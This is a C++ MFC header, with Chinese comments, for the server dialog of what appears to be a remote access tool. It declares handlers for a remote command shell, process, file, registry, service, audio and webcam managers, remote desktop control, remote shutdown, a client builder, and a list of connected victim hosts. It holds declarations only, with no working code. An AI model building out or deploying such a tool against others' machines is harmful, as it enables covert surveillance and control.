
// ServerDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "_IOCPServer.h"
#include "_ConfigFlie.h"
#include"Common.h"

typedef struct
{
	char* TitleData;    //列表的名称
	int TitleWidth;     //列表的宽度
}COLUMN_DATA;

// CServerDlg 对话框
class CServerDlg : public CDialogEx
{
// 构造
public:
	CServerDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
private:
	CBitmap m_Bitmap[30];   //添加的图片在构造函数里面去load位图资源
	CStatusBar m_StatusBar;
	CTrueColorToolBar m_TureColorToolBar;
	NOTIFYICONDATA m_NotifyIconData;
	int m_ListenPort ;
	int m_MaxConnection ;
public :


	VOID CServerDlg::MyGetSystemTime();
	VOID CServerDlg::InitListControl();
	VOID CServerDlg::InitSoildMenu();
	VOID CServerDlg::InitStatusBar();
	VOID CServerDlg::InitTureToolBarMain();
	VOID CServerDlg::ShowDialogMessage(BOOL IsOk, CString Message);
	
	
	//动态申请通讯引擎对象
	VOID CServerDlg::ServerStart();
	
	//托盘映射相关
	VOID InitNotifyIconData();
	afx_msg void OnNotifyIconData(WPARAM ParamterData1, LPARAM ParamterData2);


	//WindowNotifyProcedure窗口回调信息机制相应机制
	static VOID CALLBACK CServerDlg::WindowNotifyProcedure(PCONTEXT_OBJECT ContextObject);
	static VOID  CServerDlg::WindowHandleIO(CONTEXT_OBJECT *ContextObject);

	//真彩button消息函数
	//afx_msg LRESULT OnButtonCmdManager(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg VOID OnButtonCmdManager();
	afx_msg VOID OnButtonProcessManager();
	afx_msg VOID OnButtonWindowsManager();
	afx_msg VOID OnButtonRemoteControl();
	afx_msg VOID OnButtonFileManager();
	afx_msg VOID OnButtonAudioManager();
	afx_msg VOID OnButtonCleanManager();
	afx_msg VOID OnButtonVideoManager();
	afx_msg VOID OnButtonServiceManager();
	afx_msg VOID OnButtonRegisterManager();
	afx_msg VOID OnButtonServerManager();
	afx_msg VOID OnButtonCreateClient();
	afx_msg VOID OnButtonServerAbout();

	


public:
	CListCtrl m_CListCtrl_Server_Dialog_Online;
	CListCtrl m_CListCtrl_Server_Dialog_Message;
	
	//主对框上的固定菜单
	afx_msg void OnMenuServerDialogSet();
	afx_msg void OnMenuServerDialogExit();
	afx_msg void OnMenuServerDialogAdd();

	
	
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();

	afx_msg void OnNotityicondataShow();
	afx_msg void OnNotityicondataExit();
	afx_msg void OnTimer(UINT_PTR nIDEvent);

	//客户端上线消息函数
	afx_msg LRESULT OnClientLogin(WPARAM ParamterData1, LPARAM ParamterData2);
	VOID CServerDlg::AddCtrlListServerOnline(CString ClientAddress,
		CString HostName, CString OSName, CString ProcessorNameString, CString IsWebCamerExist,
		CString WebSpeed, CONTEXT_OBJECT* ContextObject);
	//与客户端的远程消息
	afx_msg LRESULT OnRemoteMessageDialog(WPARAM ParamterData1, LPARAM ParamterData2);

	//OnlineList动态菜单相关操作
	afx_msg void OnMenuListServerDialogOnlineDisconnection();
	afx_msg void OnMenuListServerDialogOnlineRemoteMessage();
	afx_msg void OnMenuListServerDialogOnlineRemoteShutdown();
	afx_msg void OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult);
	VOID CServerDlg::SendSelectedCommand(PBYTE BufferData, ULONG BufferLength);
	// CMD
	afx_msg LRESULT OnCmdManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	// 进程管理
	afx_msg LRESULT OnProcessManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnThreaderManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnHandleManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnModuleManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnWindowManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnRemoteControlDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnFileManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnAudioManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnVideoManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnServiceManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
	afx_msg LRESULT OnRegisterManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2);
};
